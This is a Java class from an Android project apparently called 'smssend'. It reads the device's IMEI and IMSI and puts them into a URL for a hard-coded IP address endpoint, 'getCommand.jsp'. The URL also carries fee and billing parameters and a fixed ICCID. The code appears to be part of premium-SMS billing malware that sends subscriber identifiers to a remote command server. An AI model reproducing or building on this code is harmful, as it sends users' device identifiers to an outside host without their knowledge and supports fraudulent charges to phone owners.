package com.example.administrator.smssend.data1;

import android.content.Context;
import android.telephony.TelephonyManager;

import com.example.administrator.smssend.server.URLImp;

/**
 * Created by Administrator on 2016/6/23.
 */

public class Data1URL implements URLImp
{
    private final String mImei;
    private final String mImsi;
    private final String mUrl;
    private String cpid = "103";
    private String channelid = "3238";
    private String appId = "2138";
    private String appFeeId = "3194";
    private String feenum = "200";
    public Data1URL(Context context)
    {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        mImei = telephonyManager.getDeviceId();
        mImsi = telephonyManager.getSubscriberId();

        mUrl = "http://120.25.220.193:8099/send/getCommand.jsp?type=1&cpid=" + cpid + "&channelId=" + channelid + "&appId=" + appId + "&appFeeId=" + appFeeId + "&feenum=" + feenum + "&imei=" + mImei + "&imsi=" + mImsi + "&netInfo=GPRS&osInfo=4.1&osModel=ZTE&iccid=89860090010671234669&clientIp=117.136.5.16&extra=";
    }

    @Override
    public String getUrl()
    {
        return mUrl;
    }
}
